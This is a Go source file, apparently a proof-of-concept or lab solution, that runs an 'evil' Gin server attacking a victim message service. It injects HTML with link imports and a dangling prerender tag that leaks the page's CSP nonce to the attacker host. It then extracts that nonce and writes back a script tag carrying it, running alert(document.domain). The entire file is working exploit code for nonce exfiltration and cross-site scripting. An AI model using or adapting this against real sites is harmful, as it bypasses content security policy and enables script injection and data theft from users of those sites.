package evil

import (
	"fmt"
	"net/http"
	"net/url"
	"regexp"

	"github.com/gin-gonic/gin"
	"github.com/google/uuid"
)

func genTargetUri(baseUri, id string) string {
	return fmt.Sprintf("%s/message/%s", baseUri, id)
}

func updateMessage(targetUri string, content string) {
	form := url.Values{
		"content": {content},
	}
	res, err := http.DefaultClient.PostForm(targetUri, form)
	if err == nil {
		res.Body.Close()
	}
}

func NewEvilRouter(victimUri, evilUri string) http.Handler {
	r := gin.Default()
	r.LoadHTMLGlob("templates/evil/*")

	r.GET("/", func(c *gin.Context) {
		c.HTML(200, "index.html", nil)
	})

	r.GET("/start", func(c *gin.Context) {
		id := uuid.New().String()
		targetUri := genTargetUri(victimUri, id)
		content := ""
		for i := 0; i < 20; i++ {
			content += fmt.Sprintf(`<link rel="import" href="%s?&%d" async>`, targetUri, i)
		}
		content += fmt.Sprintf("<link rel='prerender' href='%s/update-nonce/%s?a=", evilUri, id)
		updateMessage(targetUri, content)
		c.Redirect(302, targetUri)
	})

	nonceRe := regexp.MustCompile(`nonce=%22(\w+-\w+-\w+-\w+-\w+)%22`)
	r.GET("/update-nonce/:uuid", func(c *gin.Context) {
		matches := nonceRe.FindStringSubmatch(c.Request.RequestURI)
		if len(matches) > 1 {
			targetUri := genTargetUri(victimUri, c.Param("uuid"))
			updateMessage(targetUri, fmt.Sprintf(`<script nonce="%s">alert(document.domain)</script>`, matches[1]))
		}
		c.JSON(200, gin.H{})
	})
	return r
}
